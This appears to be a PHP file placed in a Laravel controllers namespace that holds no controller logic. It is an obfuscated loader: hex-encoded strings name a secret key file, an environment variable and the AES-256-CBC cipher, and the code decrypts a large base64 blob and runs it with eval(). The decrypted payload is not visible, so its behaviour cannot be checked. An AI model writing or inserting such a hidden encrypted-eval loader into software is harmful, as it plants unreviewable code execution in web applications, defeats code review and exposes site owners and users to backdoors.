<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('oLNFJYIOvcQaGi2s2R2JmQ==');

$c=base64_decode(

'KSWTMUVuJjDcG+gbP1wBOXF9UM4rrihYRYMTlIcrPIbjj1SiOQ8ZwG2XsZWjZ7/SvOjfROlM7GIf' .
'gpDpXddfWnomdV86hZmMFk7rfO577Vs4GLSqAqj8prgZWqdJRyEHfXdKXTXQuw9BgCvofeuBH5US' .
'fFWyNUdyBiOFfLY9TQYm3YBtuOarhSHjgVb0g0AAeCzL8bhOGCYt8wzjux/GsCRm/z2J3Du43Luo' .
'JXOqcwvlcrluj9yTn7GjqWfaOEUVvVpq1Gu4ET3ZRZqMF8IvmaPSaDRRrIWBv0XheDBlrJO5troZ' .
'DjvGfZirf/rDKiILeFMW0bvqv195NPOUKrtqMr/ZavKOLuNBKoajoyVOav6nhFaWolt5rxEuVdh/' .
'C9i+x7AVLyq1l3uCL8Mvt+hJugCCmo+3ucgWW1rYCZL3K95HdsbjPVcLUs+/IzKJ3LLfPDwJCbXp' .
'2hnTfr/j0HHQjwovJzTX2CBgDgdNhRxnE+nIR0Wqtn561cjKg/i7tqeWPweFsmvd6l7c0u8ifNXU' .
'gXnY5JCFpYjsL7nYupV3gX2Ylw5NqlSmX4cExFpDaTOSfBwPccy3x2s4PdVibRrnq9mjZvbTZ21H' .
'VW0EB7shZmVGxOq57w8owH9ZCjTiXLwHKsoohKYm8DtO6LmCv54QfCV4x8VDZwwhRFK7uYXO/Evk' .
'pLOj1EHxglWFG5q7NjHfmF18dA4BiBvZYTu/loGdpsX0w0IrHD7mUvCOv1ecaY+nlAOREAep0ACk' .
'MvYpS0G78l+44FkqEcdaSBr9WDTRHrNaDuQik5Tk6BKR/+fchD+Tzs/eA3vqat6/KADD0v0P13IT' .
'PxbG0zy1H1+FFFYFkOBU8rpCW9KAN+/+SYaT7fNZHBqbSa+Mm5p+nIdZ1qquD59zbm8Tw710lnr1' .
'poEjOmTIM5UcJAb9IdtUErcZUwdVYOnqjxvVmtelliATVIVlswaZUiu9YM8JNWleQQnDohNuMoKs' .
'Wk5qjqwXuV3/ue601ff0msxLziiR4MVs7t3NBRr2q6eJfUZC9QMsv6oebYRXY0uBLOFbuXzQtero' .
'wgCW0q+74EIRv7O0Gzu7MB/l8hiRFmUTBY1ySx3xByVKTCuE/uqdZ8z/DpkID1p3bklZu1CN+R5C' .
'x3TCTf2tCXwIkzI9UJ+1qZs7wegw5GOXhUpPSId5tmWwqjxF0k15MBirnWi4awmAVVMIKvuOowLY' .
'nvi8IM2eJ1E1W0hIFIErNoXwwOrT1anRalfWueM0kKJcqc7oFYtNETBPaClJDqGwameAFI/KCfrf' .
'IxNPgJI4of5c+dnLm1fyPURpWvqUeyOVB9R7qxbReQFj4jD7YFMHI7I32CF9uxYBJv7yGO2loBw2' .
'wC6ym2F7mt4DEQxyOwioSK7XzcfwlIXLezIdnFBCSly4K7J9/R+k93/PjFUrqHLm5tS/KThpSBIN' .
'JO7ZF4W2k5ynF+dx1tyM/Qb5vPzzNxvuGM2OIDNsPTP6XS7O6wv5C1TjWdsBgV9zBHlWW9fzzYlK' .
'9dwBqhMPO6Z7uH+B4tyFeIk+ZsTTc53KKs7ITRttpiH4RjFP4Hk1AD4jzyIY1K3liFHrSdal8Z+6' .
'BOok4u26s+D3bsJushs+vuJl+Diigr58eluMoCJ+QQYDiWkyY8/I10/9DpsYCGMZeo5fj17hPyT4' .
'1Fo5g+eN5EkuP5mkOj2T9S5j79v8nHdYLUCEOuFeJuQjtwTUYSTD2+/+60fCGwBsV8stWTLrbZaV' .
'wcZVryX2qt9awow+FrVk0tVXcrQugWRLxeFBPwNxLLdnEt75bFRNHZ7gULAbu3X1jVoehfxfjhHh' .
'GRQingMVYuP/II3Hp1ytAqYqzgLcPsRK0TiJaAOu6hgZzgVsS56jsmtMa+wc/Pcj0ZzTihVYekAD' .
'xluLbYUjwPMQ6dY64B9OEGk7kR+jQ8SzAO3QoJTScCt7bLsp4dDPEumE39JXFrg3u5Ed+3zmpSIv' .
'zrohug2aX9slLmT5CsqxTq1TNd8Ctcr38XpzGmtSK+FXFc81arUq4aVDG3ZOeX050mofz6l6p7Yt' .
'DhxtRaOpQYoXCvixTzddplbOw4p+jd7GEe2TROz/V5222E5soS/XOhuU9XTYxnID7xD2h3bcDc77' .
'JW1DoEireRNvbevPMPs+LuqHK4B7ip6E5JtbqUfFOxoAYUxeoplwi/AyQVGEiwcZCuX9nxaPCekJ' .
'yGeGZG0ItJBvBw7UOI+YhlSS2AiHEmHSX5ghGUGAT7iMEuDIZ/CB/Fyv3vAqyw3pVFtDxpEXN9zZ' .
'1SP0BufAiErlafOomGQjNXwdTDjmJau6pd3T0acpXniZtSxbyTvSsEVJCLaGxL/CsydcK4p/7fhE' .
'Se2wgDfieVTOqV8aoFVQYiZJvD28AlSoZlWoQ3ofWirzwy/J6QtVVPtaI+Ym4dse1qudxyHNz6e3' .
'uVDgFt/zxn8n1rd9vsUNielIbIgwz8VllIIEqCYTKHs6nGkCF5bVEVUVzsOUw83c9vfMYW+uCalg' .
'Y/8+2a9PP0pEXrhDS606IXw/h4NO42E6w4onUcHRjONTrtSNv0klMvHvXnboIhsuVFSLByY3Efr1' .
'zGDTgSD/jZacRbdtUYdosTMwziuyOzE+rWmEwT8rTQMV0e9DWqro+8G+tWf90lVm8bWfUJ8V6cGC' .
'QVm1F81dVrReqJfc2rWdx1gT0wJSSEJJtule/EWXvMm2oBsXrem9Es5muk+T11s4mY4aQkzTlyyP' .
'hlUPsvzW/iml5ezXORx/6JuR+xxmyGsXWAt1Os7gCnYyIgnJw/RAhZWtyZ7RlVmFmWhZ7iOVTASH' .
'/4BZLCmc8q57Y7BA1qy2UbOkMaV+zqdvPw/alft/BdnxDYCryCho8HKQGmdP46gQm8Z0ZWI3R6uB' .
'dshjzLhCsPmcNhoSRmCsSyS3gDZ7xYL23j7iEuPyFwcTn3WGeOGZUUH6VlMkPbxtwlfzmYISgj/y' .
'AF8FK27lp2RAFs5RJkY/EJb8R+dxXGw2qgXpf7Du9g4FRYfBupqTx2cBydZHR9qw6pFeJ9IqNBEE' .
'Tysid1121wXjRNEVoa5CD5D7jnubh53YVyO6tuEVhy+J5xQn9YsPvmHoWSOB2Dy34YTCcTkX1LJi' .
'83ugFPfreHTG8+7MhIecZ9AqTUmlCikDWq4cTDnV9ARv+f2OvMhAuMTo28+hWy1LXMHuwlF525ec' .
'taPIWrpmBKRwO/Fq9PLAwTph2XerpLh4xsqzQCxxWJWAnTIrXs7hNg69Ygz9+QHoJSym1O1edT4Z' .
'CjiaQjPmeBZ2CfVVHbCeNUrQnT81WoOs5+qOQZJJyvQxPliushx4SaQFNDyfx6Ku/fBsaDOuLRP5' .
'viBWHqdQiGf2e/QZbEgDI5z4Q7TQzzyRRnT+DidNG86lGRmmkGGqCFrzX6AHixvw4ITQgRd9w82f' .
'XGF8LIo7Ft7hdHQx6GoM4xYzo9IZ9NJAsw0X'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

